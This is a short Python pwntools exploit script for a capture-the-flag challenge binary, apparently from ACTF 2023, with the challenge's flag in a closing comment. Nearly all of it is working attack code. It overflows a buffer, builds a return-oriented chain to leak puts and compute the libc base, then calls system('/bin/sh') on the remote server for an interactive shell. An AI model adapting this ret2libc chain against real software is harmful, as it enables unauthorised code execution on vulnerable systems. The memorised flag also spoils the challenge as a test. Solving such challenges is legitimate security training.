from pwn import *
elf = context.binary = ELF("gaga2")
libc = ELF("../Actf2023/libc.so.6")
context.log_level = "DEBUG"
#p = process()
p = remote("challs.actf.co",31302)
p.recvuntil(b'Your input: ')
rop_elf = ROP(elf)
pop_rdi = rop_elf.find_gadget(["pop rdi","ret"])[0]
ret = rop_elf.find_gadget(["ret"])[0]
payload = b'A'*64
payload += p64(elf.got.gets)
payload += p64(elf.plt.gets)
payload += p64(pop_rdi)
payload += p64(elf.got.puts)
payload += p64(elf.plt.puts)
payload += p64(elf.sym._start)
payload += b'\n'
p.sendline(payload) 
puts_dynamic= u64(p.recvline().split(b'\x0a')[0].ljust(8, b'\x00'))
log.info(hex(puts_dynamic))
base_libc = puts_dynamic - libc.sym.puts
libc.address = base_libc
log.info(hex(base_libc))
bin_sh = next(libc.search(b"/bin/sh"))
system = libc.symbols["system"]
p.recv()
payload = b'A'*64
payload += p64(elf.got.gets)
payload += p64(elf.plt.gets)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)
payload += b'\n'
p.sendline(payload)
p.interactive()
#actf{b4by's_f1rst_pwn!_3857ffd6bfdf775e}